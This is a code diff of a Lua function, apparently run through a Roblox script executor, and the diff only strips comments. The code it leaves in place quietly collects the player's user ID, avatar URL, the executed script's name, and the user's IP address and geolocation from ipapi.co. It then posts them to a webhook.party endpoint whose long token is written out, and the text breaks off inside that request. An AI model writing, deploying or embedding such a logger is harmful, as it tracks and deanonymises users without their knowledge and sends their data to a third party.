@@ -2,20 +2,17 @@ return function(scriptName)
     local httpService = game:GetService("HttpService")
     local player = game:GetService("Players").LocalPlayer
 
-    -- Obtener la URL del avatar del jugador
     local toURL = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false"
     local successAvatar, avatarData = pcall(function()
         return httpService:JSONDecode(game:HttpGet(toURL)).data[1].imageUrl
     end)
 
-    -- Obtener datos de IP
     local successIP, ipData = pcall(function()
         return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
     end)
 
     ipData = successIP and ipData or {}
 
-    -- Función para crear campos dinámicos
     local function createField(name, key)
         local value
         if key == "executed_script" then
@@ -29,7 +26,6 @@ return function(scriptName)
         }
     end
 
-    -- Enviar datos a Webhook
     pcall(function()
         (request or http_request or http and http.request)({
             Url = "https://l.webhook.party/hook/UhmC9lTLZKI6YMQfc9LwrwLPFzL%2BGxFO%2BstLQOE3slw9Bev78Zkfkc0IOdkr6%2Fvo45MpGmza1zthpwRkkP972KrY1Zdpp6kiK5LzyMr09xxU8%2FdybOnABAdHQG2tZZGd2Rcu9uY7DLe3YChbg7Silc9K9sYiRACjKoWOP1ntopw7zpCvqeGUaGZs5Zmiy7A%2BmKiYOe2iHdy4mH2Udl0%2FI%2FMB20D9U7pKmnbTQcKATLXml9l1oVTDeC9O3BRo%2FLrj0UbFr6BiFDgAdmuHAifBuGhQMBmY56JA%2BG2Aot8qMhpPnqVOn8Os8YKZ4N%2BRcFG7agnQWPVjwLgWJ4G2MQ3AZywHy47Kz4ONmhkx150FbG4XZdGZxcCaZsDAz4xm%2FQG8XRi4GWRkPKw%3D/ViaTuzjhjElC6x2r",
